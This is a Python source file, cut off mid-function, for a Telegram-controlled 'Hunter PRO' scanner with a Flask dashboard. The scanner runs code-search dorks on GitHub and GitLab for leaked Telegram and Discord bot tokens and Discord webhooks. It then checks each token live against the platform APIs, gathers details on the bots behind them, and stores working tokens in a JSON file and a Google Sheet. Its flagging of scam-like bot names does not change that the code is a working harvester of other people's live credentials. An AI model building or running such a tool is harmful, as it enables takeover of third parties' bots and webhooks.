import os
import re
import io
import html
import time
import json
import base64
import random
import urllib.parse
import threading
import concurrent.futures
from typing import List, Dict, Optional, Tuple, Any
from datetime import datetime
from collections import Counter

import requests
import telebot
from telebot import types, apihelper
from flask import Flask, jsonify, render_template_string

import matplotlib
matplotlib.use("Agg")
import matplotlib.pyplot as plt

import gspread
from google.oauth2.service_account import Credentials


# =====================================================================
# НАСТРОЙКИ И КОНФИГУРАЦИЯ (Environment Variables)
# =====================================================================
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN", "").strip()
GITLAB_TOKEN = os.getenv("GITLAB_TOKEN", "").strip()
CONTROL_BOT_TOKEN = os.getenv("CONTROL_BOT_TOKEN", "").strip()
ADMIN_ID_RAW = os.getenv("ADMIN_ID", "0").strip()

try:
    ADMIN_ID = int(ADMIN_ID_RAW)
except ValueError:
    ADMIN_ID = 0

GOOGLE_CREDS_B64 = os.getenv("GOOGLE_CREDS_B64", "").strip()
GOOGLE_CREDS_JSON_RAW = os.getenv("GOOGLE_CREDS_JSON", "").strip()
SPREADSHEET_ID = os.getenv("SPREADSHEET_ID", "").strip()
SHEET_NAME = os.getenv("SHEET_NAME", "").strip()

SEEN_DB_FILE = os.getenv("SEEN_DB_FILE", "seen_tokens.txt")
LIVE_DB_FILE = os.getenv("LIVE_DB_FILE", "live_tokens.json")
MAX_WORKERS = int(os.getenv("MAX_WORKERS", "10"))
MAX_LOG_LINES = 15

if not CONTROL_BOT_TOKEN:
    raise RuntimeError("Не задана переменная окружения CONTROL_BOT_TOKEN!")

bot = telebot.TeleBot(CONTROL_BOT_TOKEN, threaded=True, num_threads=8)
app = Flask(__name__)

# Общая HTTP-сессия для переиспользования соединений
http_session = requests.Session()
http_session.headers.update({
    "User-Agent": "HunterPRO-Scanner/6.0 (+https://github.com)"
})


# =====================================================================
# РЕГУЛЯРНЫЕ ВЫРАЖЕНИЯ И СЛОВАРИ
# =====================================================================
TG_TOKEN_RE = re.compile(
    r"\b\d{8,10}:AA[A-Za-z0-9_-]{32}\b|\b\d{8,10}:[A-Za-z0-9_-]{35}\b"
)
DISCORD_TOKEN_RE = re.compile(
    r"[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}"
)
DISCORD_WEBHOOK_RE = re.compile(
    r"https://(?:ptb\.|canary\.)?discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_-]+"
)

BASE_DORKS = [
    "BOT_TOKEN",
    "TELEGRAM_BOT_TOKEN",
    "bot_token",
    "api.telegram.org/bot",
    "DISCORD_TOKEN",
    "discord.com/api/webhooks",
]

NOISE_FILTERS = "NOT example NOT sample NOT YOUR_TOKEN NOT token_here NOT placeholder"

TARGET_FILENAMES = [
    "",
    "filename:.env",
    "filename:config.py",
    "filename:settings.py",
    "filename:config.json",
    "filename:.js",
]

HACKER_PHRASES = [
    "Сканирую GitHub и GitLab...",
    "Проверяю окна лимитов API...",
    "Анализирую фрагменты кода...",
    "Сверяю найденные ключи с базой...",
    "Проверяю активность ботов и вебхуков...",
    "Собираю досье по найденным целям...",
    "Фильтрую шаблоны и примеры...",
    "Обновляю телеметрию поиска...",
]

SPINNERS = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]

SCAM_KEYWORDS = [
    "support", "security", "crypto", "giveaway", "bonus",
    "airdrop", "check", "verify", "official", "help",
    "проверка", "гарант", "escrow", "drain", "stealer", "seed", "wallet"
]


# =====================================================================
# СОСТОЯНИЕ И БЛОКИРОВКИ
# =====================================================================
db_lock = threading.RLock()
sheets_lock = threading.Lock()
state_lock = threading.Lock()

search_state: Dict[str, Any] = {
    "is_searching": False,
    "stop_requested": False,
    "limit_live": 5,
    "found_live_current": 0,
    "checked_tokens": 0,
    "dead_tokens": 0,
    "scam_tokens": 0,
    "start_time": None,
    "current_query": "Ожидание запуска...",
    "status_text": "Ожидание...",
    "logs": [],
    "phrase": "Готов к работе",
}

_cached_worksheet = None
_sheets_init_attempted = False
_sheets_last_error = ""


# =====================================================================
# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
# =====================================================================
def is_admin(chat_id: Optional[int], user_id: Optional[int] = None) -> bool:
    if ADMIN_ID <= 0:
        return True
    if chat_id == ADMIN_ID:
        return True
    if user_id is not None and user_id == ADMIN_ID:
        return True
    return False


def format_time(seconds: Optional[float]) -> str:
    if not seconds or seconds < 0:
        return "00:00:00"
    total = int(seconds)
    minutes, sec = divmod(total, 60)
    hours, minutes = divmod(minutes, 60)
    return f"{hours:02d}:{minutes:02d}:{sec:02d}"


def add_log(text: str, print_stdout: bool = True) -> None:
    time_str = datetime.now().strftime("%H:%M:%S")
    clean_text = str(text).replace("\n", " ").strip()
    log_entry = f"[{time_str}] {clean_text}"
    with state_lock:
        search_state["logs"].append(log_entry)
        if len(search_state["logs"]) > MAX_LOG_LINES:
            search_state["logs"] = search_state["logs"][-MAX_LOG_LINES:]
    if print_stdout:
        print(log_entry, flush=True)


def set_status(status: str, query: Optional[str] = None) -> None:
    with state_lock:
        search_state["status_text"] = status
        if query is not None:
            search_state["current_query"] = query


def get_state_snapshot() -> Dict[str, Any]:
    with state_lock:
        elapsed = (
            time.time() - search_state["start_time"]
            if search_state["start_time"]
            else 0
        )
        return {
            "is_searching": search_state["is_searching"],
            "stop_requested": search_state["stop_requested"],
            "limit_live": search_state["limit_live"],
            "found_live_current": search_state["found_live_current"],
            "checked_tokens": search_state["checked_tokens"],
            "dead_tokens": search_state["dead_tokens"],
            "scam_tokens": search_state["scam_tokens"],
            "elapsed_seconds": elapsed,
            "time": format_time(elapsed),
            "current_query": search_state["current_query"],
            "status_text": search_state["status_text"],
            "logs": list(search_state["logs"]),
            "phrase": search_state["phrase"],
        }


# =====================================================================
# GOOGLE SHEETS (КЭШИРОВАНИЕ + ПОДРОБНАЯ ДИАГНОСТИКА ОШИБОК)
# =====================================================================
def _parse_google_credentials() -> Dict[str, Any]:
    if GOOGLE_CREDS_B64:
        raw_b64 = GOOGLE_CREDS_B64.strip()
        # Поддержка URL-safe base64 и отсутствующего padding '='
        missing_padding = len(raw_b64) % 4
        if missing_padding:
            raw_b64 += "=" * (4 - missing_padding)
        try:
            decoded = base64.b64decode(raw_b64).decode("utf-8")
            return json.loads(decoded)
        except Exception as b64_err:
            # На случай если в GOOGLE_CREDS_B64 положили обычный JSON
            try:
                return json.loads(GOOGLE_CREDS_B64)
            except Exception:
                raise ValueError(f"Ошибка декодирования GOOGLE_CREDS_B64: {b64_err}")

    if GOOGLE_CREDS_JSON_RAW:
        return json.loads(GOOGLE_CREDS_JSON_RAW)

    raise ValueError("Не заданы GOOGLE_CREDS_B64 или GOOGLE_CREDS_JSON")


def get_google_worksheet(force_reconnect: bool = False):
    global _cached_worksheet, _sheets_init_attempted, _sheets_last_error

    if not SPREADSHEET_ID:
        _sheets_last_error = "Не задан SPREADSHEET_ID"
        return None

    with sheets_lock:
        if _cached_worksheet is not None and not force_reconnect:
            return _cached_worksheet

        if _sheets_init_attempted and not force_reconnect and _sheets_last_error:
            return None

        _sheets_init_attempted = True
        try:
            creds_dict = _parse_google_credentials()
            scopes = [
                "https://www.googleapis.com/auth/spreadsheets",
                "https://www.googleapis.com/auth/drive",
            ]
            creds = Credentials.from_service_account_info(creds_dict, scopes=scopes)
            client = gspread.authorize(creds)
            spreadsheet = client.open_by_key(SPREADSHEET_ID)

            if SHEET_NAME:
                worksheet = spreadsheet.worksheet(SHEET_NAME)
            else:
                worksheet = spreadsheet.sheet1

            # Проверяем первую строку — если лист пустой, добавляем заголовки
            first_row = worksheet.row_values(1)
            if not first_row:
                worksheet.append_row([
                    "Время",
                    "Платформа",
                    "Имя / Цель",
                    "Токен / URL",
                    "Источник",
                    "Скам?",
                ])

            _cached_worksheet = worksheet
            _sheets_last_error = ""
            add_log(f"☁️ Google Sheets подключён: '{spreadsheet.title}' -> '{worksheet.title}'")
            return _cached_worksheet

        except Exception as exc:
            _sheets_last_error = str(exc)
            add_log(f"❌ Ошибка инициализации Google Sheets: {_sheets_last_error}")
            return None


def save_to_google_sheets(data: Dict[str, Any]) -> bool:
    if not SPREADSHEET_ID or (not GOOGLE_CREDS_B64 and not GOOGLE_CREDS_JSON_RAW):
        return False

    with sheets_lock:
        worksheet = get_google_worksheet(force_reconnect=False)
        if worksheet is None:
            return False

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        row = [
            timestamp,
            str(data.get("type", "")),
            str(data.get("bot", "")),
            str(data.get("token", "")),
            str(data.get("url", "")),
            "Да" if data.get("scam") else "Нет",
        ]

        try:
            worksheet.append_row(row, value_input_option="USER_ENTERED")
            add_log("☁️ Записано в Google Таблицу!")
            return True
        except Exception as exc:
            # Пробуем переподключиться один раз (например, при протухшем токене доступа)
            add_log(f"⚠️ Повторное подключение к Google Sheets ({exc})...")
            worksheet = get_google_worksheet(force_reconnect=True)
            if worksheet is not None:
                try:
                    worksheet.append_row(row, value_input_option="USER_ENTERED")
                    add_log("☁️ Записано в Google Таблицу после реконнекта!")
                    return True
                except Exception as retry_exc:
                    add_log(f"❌ Ошибка записи в Google Sheets: {retry_exc}")
                    return False
            return False


# =====================================================================
# БАЗА ДАННЫХ (seen_tokens.txt и live_tokens.json)
# =====================================================================
def load_seen_tokens() -> set:
    with db_lock:
        if not os.path.exists(SEEN_DB_FILE):
            return set()
        try:
            with open(SEEN_DB_FILE, "r", encoding="utf-8") as f:
                return {line.strip() for line in f if line.strip()}
        except Exception as exc:
            add_log(f"⚠️ Ошибка чтения {SEEN_DB_FILE}: {exc}")
            return set()


def append_seen_token(token: str) -> None:
    if not token:
        return
    with db_lock:
        try:
            with open(SEEN_DB_FILE, "a", encoding="utf-8") as f:
                f.write(f"{token}\n")
        except Exception as exc:
            add_log(f"⚠️ Ошибка записи в {SEEN_DB_FILE}: {exc}")


def clear_seen_tokens() -> None:
    with db_lock:
        try:
            with open(SEEN_DB_FILE, "w", encoding="utf-8") as f:
                f.write("")
        except Exception as exc:
            add_log(f"⚠️ Ошибка очистки {SEEN_DB_FILE}: {exc}")


def load_live_tokens() -> List[Dict[str, Any]]:
    with db_lock:
        if not os.path.exists(LIVE_DB_FILE):
            return []
        try:
            with open(LIVE_DB_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                return data if isinstance(data, list) else []
        except Exception as exc:
            add_log(f"⚠️ Ошибка чтения {LIVE_DB_FILE}: {exc}")
            return []


def save_live_token(token_data: Dict[str, Any]) -> bool:
    added = False
    with db_lock:
        live_list = []
        if os.path.exists(LIVE_DB_FILE):
            try:
                with open(LIVE_DB_FILE, "r", encoding="utf-8") as f:
                    loaded = json.load(f)
                    if isinstance(loaded, list):
                        live_list = loaded
            except Exception:
                live_list = []

        if not any(item.get("token") == token_data.get("token") for item in live_list):
            enriched = dict(token_data)
            enriched.setdefault("found_at", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
            live_list.append(enriched)
            try:
                with open(LIVE_DB_FILE, "w", encoding="utf-8") as f:
                    json.dump(live_list, f, ensure_ascii=False, indent=4)
                added = True
            except Exception as exc:
                add_log(f"❌ Ошибка сохранения {LIVE_DB_FILE}: {exc}")

    if added:
        threading.Thread(
            target=save_to_google_sheets,
            args=(token_data,),
            daemon=True,
        ).start()
    return added


# =====================================================================
# ПРОВЕРКА ТОКЕНОВ И ВЕБХУКОВ + ДОСЬЕ
# =====================================================================
def get_telegram_bot_dossier(token: str) -> str:
    try:
        desc_resp = http_session.get(
            f"https://api.telegram.org/bot{token}/getMyDescription",
            timeout=6,
        )
        desc_data = desc_resp.json() if desc_resp.ok else {}
        raw_desc = desc_data.get("result", {}).get("description") or "Нет описания"
        safe_desc = html.escape(str(raw_desc).strip()[:300])

        cmd_resp = http_session.get(
            f"https://api.telegram.org/bot{token}/getMyCommands",
            timeout=6,
        )
        cmd_data = cmd_resp.json() if cmd_resp.ok else {}
        raw_cmds = cmd_data.get("result") or []
        if isinstance(raw_cmds, list) and raw_cmds:
            cmds_formatted = ", ".join(
                html.escape(f"/{c.get('command', '')}")
                for c in raw_cmds[:15]
                if isinstance(c, dict) and c.get("command")
            ) or "Нет команд"
        else:
            cmds_formatted = "Нет команд"

        return f"📝 <b>Био:</b> {safe_desc}\n📜 <b>Команды:</b> {cmds_formatted}"
    except Exception:
        return "Не удалось загрузить полное досье."


def check_telegram_token(token: str) -> Tuple[bool, Optional[str], bool, str]:
    url = f"https://api.telegram.org/bot{token}/getMe"
    try:
        resp = http_session.get(url, timeout=6)
        if resp.status_code != 200:
            return False, None, False, ""
        payload = resp.json()
        if payload.get("ok") and isinstance(payload.get("result"), dict):
            result = payload["result"]
            username = result.get("username") or result.get("first_name") or "UnknownBot"
            first_name = str(result.get("first_name", "")).lower()
            username_lower = str(username).lower()

            is_suspicious = any(
                word in first_name or word in username_lower
                for word in SCAM_KEYWORDS
            )
            dossier = get_telegram_bot_dossier(token)
            return True, str(username), is_suspicious, dossier
    except Exception:
        pass
    return False, None, False, ""


def check_discord_token(token: str) -> Tuple[bool, Optional[str], bool, str]:
    url = "https://discord.com/api/v10/users/@me"
    headers = {"Authorization": f"Bot {token}"}
    try:
        resp = http_session.get(url, headers=headers, timeout=6)
        if resp.status_code == 200:
            data = resp.json()
            username = data.get("username") or "DiscordBot"
            discriminator = data.get("discriminator")
            if discriminator and discriminator != "0":
                display_name = f"{username}#{discriminator}"
            else:
                display_name = str(username)

            lower_name = display_name.lower()
            is_suspicious = any(word in lower_name for word in SCAM_KEYWORDS)
            return True, display_name, is_suspicious, "🤖 Discord Bot Token активен"
    except Exception:
        pass
    return False, None, False, ""


def check_discord_webhook(webhook_url: str) -> Tuple[bool, Optional[str]]:
    try:
        resp = http_session.get(webhook_url, timeout=6)
        if resp.status_code == 200:
            data = resp.json()
            name = data.get("name") or "Webhook"
            channel_id = data.get("channel_id")
            label = f"{name} (ch:{channel_id})" if channel_id else str(name)
            return True, label
    except Exception:
        pass
    return False, None


def extract_findings_from_text(
    text: str,
    repo_full_name: str,
    html_url: str,
    seen_tokens: set,
) -> List[Dict[str, str]]:
    if not text:
        return []

    found: List[Dict[str, str]] = []
    seen_in_batch = set()

    patterns = [
        ("Telegram", TG_TOKEN_RE),
        ("Discord", DISCORD_TOKEN_RE),
        ("Webhook", DISCORD_WEBHOOK_RE),
    ]

    for platform, regex in patterns:
        for match in regex.findall(text):
            candidate = match.strip()
            if not candidate:
                continue
            if candidate in seen_tokens or candidate in seen_in_batch:
                continue
            seen_in_batch.add(candidate)
            found.append({
                "type": platform,
                "token": candidate,
                "repo": repo_full_name,
                "url": html_url,
            })

    return found


# =====================================================================
# ПОИСК: GITHUB И GITLAB
# =====================================================================
def _sleep_respecting_stop(seconds: float) -> None:
    deadline = time.time() + max(0.0, seconds)
    while time.time() < deadline:
        with state_lock:
            if search_state["stop_requested"]:
                break
        time.sleep(0.5)


def search_github_dynamic() -> Tuple[List[Dict[str, str]], int]:
    if not GITHUB_TOKEN:
        add_log("⚠️ GITHUB_TOKEN не задан — пропуск поиска на GitHub")
        _sleep_respecting_stop(5)
        return [], 401

    findings: List[Dict[str, str]] = []
    seen_tokens = load_seen_tokens()

    base = random.choice(BASE_DORKS)
    lang = random.choice(["python", "javascript", "typescript", "php", "go", "json", ""])
    file_filter = random.choice(TARGET_FILENAMES)

    parts = [base, NOISE_FILTERS, "in:file"]
    if lang:
        parts.append(f"language:{lang}")
    if file_filter:
        parts.append(file_filter)

    query = " ".join(parts)
    set_status(search_state["status_text"], f"GitHub: {query}")

    headers = {
        "Accept": "application/vnd.github.text-match+json",
        "Authorization": f"Bearer {GITHUB_TOKEN}",
        "X-GitHub-Api-Version": "2022-11-28",
    }
    params = {
        "q": query,
        "per_page": 50,
        "page": random.randint(1, 2),
        "sort": "indexed",
        "order": "desc",
    }

    try:
        resp = http_session.get(
            "https://api.github.com/search/code",
            headers=headers,
            params=params,
            timeout=15,
        )

        if resp.status_code == 401:
            set_status("❌ Ошибка авторизации GitHub Token!")
            add_log("❌ GitHub вернул 401 Unauthorized. Проверь GITHUB_TOKEN.")
            with state_lock:
                search_state["stop_requested"] = True
            return [], 401

        if resp.status_code in (403, 429):
            reset_ts = resp.headers.get("X-RateLimit-Reset")
            wait_sec = 60
            if reset_ts and reset_ts.isdigit():
                calc = int(reset_ts) - int(time.time()) + 2
                wait_sec = max(5, min(calc, 180))
            set_status(f"⚠️ Лимит GitHub API. Пауза {wait_sec}с")
            add_log(f"⏳ Rate limit GitHub ({resp.status_code}). Жду {wait_sec} сек.")
            _sleep_respecting_stop(wait_sec)
            return [], resp.status_code

        resp.raise_for_status()
        items = resp.json().get("items") or []

        for item in items:
            repo_name = (item.get("repository") or {}).get("full_name") or "unknown/repo"
            html_url = item.get("html_url") or "https://github.com"
            fragments = []
            for m in item.get("text_matches") or []:
                frag = m.get("fragment")
                if frag:
                    fragments.append(frag)

            combined = "\n".join(fragments)
            extracted = extract_findings_from_text(combined, repo_name, html_url, seen_tokens)
            for item_found in extracted:
                append_seen_token(item_found["token"])
                seen_tokens.add(item_found["token"])
                findings.append(item_found)

        _sleep_respecting_stop(8)
        return findings, 200

    except requests.RequestException as exc:
        add_log(f"⚠️ Сетевая ошибка GitHub: {exc}")
        _sleep_respecting_stop(8)
        return [], 500
    except Exception as exc:
        add_log(f"❌ Ошибка парсинга GitHub: {exc}")
        _sleep_respecting_stop(8)
        return [], 500


def search_gitlab() -> List[Dict[str, str]]:
    if not GITLAB_TOKEN:
        return []

    findings: List[Dict[str, str]] = []
    seen_tokens = load_seen_tokens()
    query = random.choice(["BOT_TOKEN", "api.telegram.org/bot", "discord.com/api/webhooks"])
    set_status(search_state["status_text"], f"GitLab: {query}")

    headers = {"PRIVATE-TOKEN": GITLAB_TOKEN}
    params = {"scope": "blobs", "search": query, "per_page": 10}

    try:
        resp = http_session.get(
            "https://gitlab.com/api/v4/search",
            headers=headers,
            params=params,
            timeout=15,
        )
        if resp.status_code != 200:
            return []

        blobs = resp.json()
        if not isinstance(blobs, list):
            return []

        for blob in blobs[:8]:
            with state_lock:
                if search_state["stop_requested"]:
                    break

            project_id = blob.get("project_id")
            file_path = blob.get("path") or blob.get("filename")
            ref = blob.get("ref") or "main"

            if not project_id or not file_path:
                continue

            encoded_path = urllib.parse.quote(file_path, safe="")
            raw_url = (
                f"https://gitlab.com/api/v4/projects/{project_id}/repository/files/"
                f"{encoded_path}/raw"
            )
            try:
                raw_resp = http_session.get(
                    raw_url,
                    headers=headers,
                    params={"ref": ref},
                    timeout=10,
                )
                if raw_resp.status_code != 200:
                    continue

                content = raw_resp.text[:150000]
                web_url = f"https://gitlab.com/{project_id}/-/blob/{ref}/{file_path}"
                extracted = extract_findings_from_text(
                    content,
                    f"gitlab/{project_id}",
                    web_url,
                    seen_tokens,
                )
                for item_found in extracted:
                    append_seen_token(item_found["token"])
                    seen_tokens.add(item_found["token"])
                    findings.append(item_found)
            except Exception:
                continue

    except Exception as exc:
        add_log(f"⚠️ Ошибка GitLab: {exc}")

    return findings


# =====================================================================
# ГРАФИКИ СТАТИСТИКИ
# =====================================================================
def generate_stats_chart() -> io.BytesIO:
    snap = get_state_snapshot()
    live_saved = len(load_live_tokens())

    live_count = max(snap["found_live_current"], live_saved) if snap["found_live_current"] == 0 else snap["found_live_current"]
    dead_count = snap["dead_tokens"]
    scam_count = snap["scam_tokens"]

    labels = ["Живые", "Мёртвые", "Скам"]
    sizes = [live_count, dead_count, scam_count]
    colors = ["#00ff88", "#ff4d4d", "#ffb703"]

    if sum(sizes) == 0:
        sizes = [1]
        labels = ["Нет данных"]
        colors = ["#3a3f4b"]

    fig, ax = plt.subplots(figsize=(6, 4), facecolor="#14171f")
    ax.set_facecolor("#14171f")

    ax.pie(
        sizes,
        labels=labels,
        colors=colors,
        autopct="%1.1f%%",
        textprops={"color": "#f0f6fc", "fontweight": "bold", "fontsize": 10},
        startangle=140,
    )
    ax.set_title(
        "Статистика поиска (Hunter PRO)",
        color="#00ff88",
        fontweight="bold",
        fontsize=12,
        pad=12,
    )

    buf = io.BytesIO()
    plt.tight_layout()
    plt.savefig(buf, format="png", facecolor="#14171f", dpi=130)
    buf.seek(0)
    plt.close(fig)
    return buf


# =====================================================================
# FLASK ВЕБ-ДАШБОРД
# =====================================================================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="utf-8">
    <title>Hunter PRO Dashboard</title>
    <style>
        body {
            background-color: #0d1117;
            color: #00ff88;
            font-family: 'Courier New', monospace;
            padding: 20px;
            margin: 0;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
        }
        h1 {
            text-align: center;
            text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
        }
        .card {
            border: 1px solid #00ff88;
            border-radius: 8px;
            padding: 16px;
            margin-bottom: 20px;
            background: #161b22;
            box-shadow: 0 0 12px rgba(0, 255, 136, 0.12);
        }
        .grid {
            display: flex;
            flex-wrap: wrap;
            gap: 16px;
            margin-bottom: 10px;
        }
        .stat-box {
            flex: 1 1 160px;
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 6px;
            padding: 10px;
        }
        .label {
            color: #8b949e;
            font-size: 0.85em;
        }
        .value {
            font-size: 1.3em;
            font-weight: bold;
            margin-top: 4px;
        }
        .log {
            color: #c9d1d9;
            font-size: 0.88em;
            margin-top: 12px;
            line-height: 1.4;
            background: #0d1117;
            padding: 12px;
            border-radius: 6px;
            border: 1px solid #30363d;
            max-height: 360px;
            overflow-y: auto;
        }
    </style>
    <script>
        function updateData() {
            fetch('/api/stats')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('time').innerText = data.time;
                    document.getElementById('checked').innerText = data.checked;
                    document.getElementById('found').innerText = data.found + ' / ' + data.limit;
                    document.getElementById('db_total').innerText = data.db_total;
                    document.getElementById('query').innerText = data.query;
                    document.getElementById('status').innerText = data.status;

                    const logDiv = document.getElementById('logs');
                    logDiv.innerHTML = '';
                    (data.logs || []).forEach(line => {
                        const div = document.createElement('div');
                        div.textContent = '> ' + line;
                        logDiv.appendChild(div);
                    });
                })
                .catch(() => {});
        }
        setInterval(updateData, 1500);
        window.onload = updateData;
    </script>
</head>
<body>
    <div class="container">
        <h1>[ HUNTER DASHBOARD ]</h1>
        <div class="card">
            <div class="grid">
                <div class="stat-box">
                    <div class="label">Время работы</div>
                    <div class="value" id="time">00:00:00</div>
                </div>
                <div class="stat-box">
                    <div class="label">Проверено токенов</div>
                    <div class="value" id="checked">0</div>
                </div>
                <div class="stat-box">
                    <div class="label">Найдено за сессию</div>
                    <div class="value" id="found">0 / 5</div>
                </div>
                <div class="stat-box">
                    <div class="label">Всего в базе</div>
                    <div class="value" id="db_total">0</div>
                </div>
            </div>
            <p><strong>Запрос:</strong> <span id="query">...</span></p>
            <p><strong>Статус:</strong> <span id="status">...</span></p>
            <div class="log" id="logs"></div>
        </div>
    </div>
</body>
</html>
"""


@app.route("/")
def home():
    return render_template_string(HTML_TEMPLATE)


@app.route("/health")
def health():
    return jsonify({"status": "ok", "timestamp": datetime.now().isoformat()}), 200


@app.route("/api/stats")
def api_stats():
    snap = get_state_snapshot()
    return jsonify({
        "time": snap["time"],
        "checked": snap["checked_tokens"],
        "found": snap["found_live_current"],
        "limit": snap["limit_live"],
        "db_total": len(load_live_tokens()),
        "query": snap["current_query"],
        "status": snap["status_text"],
        "logs": snap["logs"],
    })


# =====================================================================
# ТЕЛЕГРАМ-БОТ: ИНТЕРФЕЙС И КОМАНДЫ
# =====================================================================
def get_main_menu() -> types.ReplyKeyboardMarkup:
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        "🚀 Начать поиск",
        "🛑 Остановить",
        "⚙️ Настройки",
        "🗂 База и Фильтры",
    )
    return markup


def get_progress_buttons() -> types.InlineKeyboardMarkup:
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📊 График", callback_data="show_chart"),
        types.InlineKeyboardButton("🏆 Топ-5", callback_data="show_top5"),
        types.InlineKeyboardButton("🔄 Обновить", callback_data="force_update"),
        types.InlineKeyboardButton("🛑 Стоп", callback_data="stop_search_btn"),
    )
    return markup


@bot.message_handler(commands=["start"])
def send_welcome(message: types.Message):
    if not is_admin(message.chat.id, message.from_user.id if message.from_user else None):
        return

    sheets_status = "подключён" if (SPREADSHEET_ID and (GOOGLE_CREDS_B64 or GOOGLE_CREDS_JSON_RAW)) else "не настроен"
    welcome_text = (
        "👋 <b>Пульт Hunter PRO</b>\n"
        "Многопоточная проверка, безопасный HTML, GitHub/GitLab поиск и Google Sheets.\n\n"
        f"☁️ Google Sheets: <code>{html.escape(sheets_status)}</code>\n"
        f"🗂 Записей в базе: <code>{len(load_live_tokens())}</code>"
    )
    bot.send_message(
        message.chat.id,
        welcome_text,
        reply_markup=get_main_menu(),
        parse_mode="HTML",
    )


@bot.message_handler(func=lambda m: m.text == "⚙️ Настройки")
def show_settings(message: types.Message):
    if not is_admin(message.chat.id, message.from_user.id if message.from_user else None):
        return

    snap = get_state_snapshot()
    current_limit = snap["limit_live"]
    limit_label = "Без лимита" if current_limit >= 999 else str(current_limit)

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("1", callback_data="limit_1"),
        types.InlineKeyboardButton("5", callback_data="limit_5"),
        types.InlineKeyboardButton("10", callback_data="limit_10"),
        types.InlineKeyboardButton("∞", callback_data="limit_999"),
    )
    bot.send_message(
        message.chat.id,
        f"⚙️ <b>Текущий лимит живых находок:</b> <code>{html.escape(limit_label)}</code>",
        reply_markup=markup,
        parse_mode="HTML",
    )


@bot.callback_query_handler(func=lambda call: call.data.startswith("limit_"))
def callback_settings(call: types.CallbackQuery):
    chat_id = call.message.chat.id if call.message else None
    user_id = call.from_user.id if call.from_user else None
    if not is_admin(chat_id, user_id):
        bot.answer_callback_query(call.id, "Доступ запрещён", show_alert=True)
        return

    try:
        limit = int(call.data.split("_", 1)[1])
    except ValueError:
        bot.answer_callback_query(call.id, "Некорректное значение")
        return

    with state_lock:
        search_state["limit_live"] = limit

    bot.answer_callback_query(call.id, "Лимит обновлён!")
    label = "Без лимита" if limit >= 999 else str(limit)
    if call.message:
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=f"✅ <b>Новый лимит:</b> <code>{html.escape(label)}</code>",
                parse_mode="HTML",
            )
        except Exception:
            pass


@bot.message_handler(func=lambda m: m.text == "🛑 Остановить")
def stop_command(message: types.Message):
    if not is_admin(message.chat.id, message.from_user.id if message.from_user else None):
        return

    with state_lock:
        search_state["stop_requested"] = True
        search_state["status_text"] = "Остановка..."
    bot.send_message(message.chat.id, "⏹️ Команда остановки принята.")


@bot.message_handler(func=lambda m: m.text == "🗂 База и Фильтры")
def show_db_menu(message: types.Message):
    if not is_admin(message.chat.id, message.from_user.id if message.from_user else None):
        return

    live_tokens = load_live_tokens()
    seen_count = len(load_seen_tokens())

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("Все", callback_data="db_all"),
        types.InlineKeyboardButton("Telegram", callback_data="db_tg"),
        types.InlineKeyboardButton("Discord", callback_data="db_dc"),
        types.InlineKeyboardButton("Только Скам / WH", callback_data="db_scam"),
        types.InlineKeyboardButton("📥 Экспорт в файл", callback_data="export_file"),
        types.InlineKeyboardButton("🧹 Сброс seen-кэша", callback_data="clear_seen"),
    )
    bot.send_message(
        message.chat.id,
        f"🗂 <b>База находок:</b> <code>{len(live_tokens)}</code> | "
        f"<b>В кэше проверенных:</b> <code>{seen_count}</code>\n"
        "Выбери фильтр или действие:",
        reply_markup=markup,
        parse_mode="HTML",
    )


@bot.callback_query_handler(func=lambda call: call.data.startswith("db_"))
def cb_show_db(call: types.CallbackQuery):
    chat_id = call.message.chat.id if call.message else None
    user_id = call.from_user.id if call.from_user else None
    if not is_admin(chat_id, user_id):
        bot.answer_callback_query(call.id, "Доступ запрещён", show_alert=True)
        return

    live_tokens = load_live_tokens()
    if not live_tokens:
        bot.answer_callback_query(call.id, "База пуста!")
        return

    filter_type = call.data.split("_", 1)[1]
    filtered = []

    for item in live_tokens:
        p_type = item.get("type", "")
        is_scam = bool(item.get("scam"))
        if filter_type == "all":
            filtered.append(item)
        elif filter_type == "tg" and p_type == "Telegram":
            filtered.append(item)
        elif filter_type == "dc" and p_type == "Discord":
            filtered.append(item)
        elif filter_type == "scam" and (is_scam or p_type == "Webhook"):
            filtered.append(item)

    if not filtered:
        bot.answer_callback_query(call.id, "По этому фильтру записей нет.")
        return

    bot.answer_callback_query(call.id, f"Найдено записей: {len(filtered)}")
    lines = [f"🗂 <b>База ({html.escape(filter_type)}) — последние {min(len(filtered), 15)}:</b>\n"]
    for item in filtered[-15:]:
        scam_icon = "⚠️" if (item.get("scam") or item.get("type") == "Webhook") else "✅"
        plat = html.escape(str(item.get("type", "TG"))[:3].upper())
        tok = html.escape(str(item.get("token", "")))
        bot_name = html.escape(str(item.get("bot", "")))
        lines.append(f"{scam_icon} <b>[{plat}]</b> {bot_name}\n<code>{tok}</code>")

    if chat_id:
        bot.send_message(
            chat_id,
            "\n".join(lines),
            parse_mode="HTML",
            disable_web_page_preview=True,
        )


@bot.callback_query_handler(func=lambda call: call.data == "export_file")
def export_live_db(call: types.CallbackQuery):
    chat_id = call.message.chat.id if call.message else None
    user_id = call.from_user.id if call.from_user else None
    if not is_admin(chat_id, user_id):
        bot.answer_callback_query(call.id, "Доступ запрещён", show_alert=True)
        return

    live_tokens = load_live_tokens()
    if not live_tokens:
        bot.answer_callback_query(call.id, "База пуста, нечего экспортировать.")
        return

    bot.answer_callback_query(call.id, "Формирую файл...")
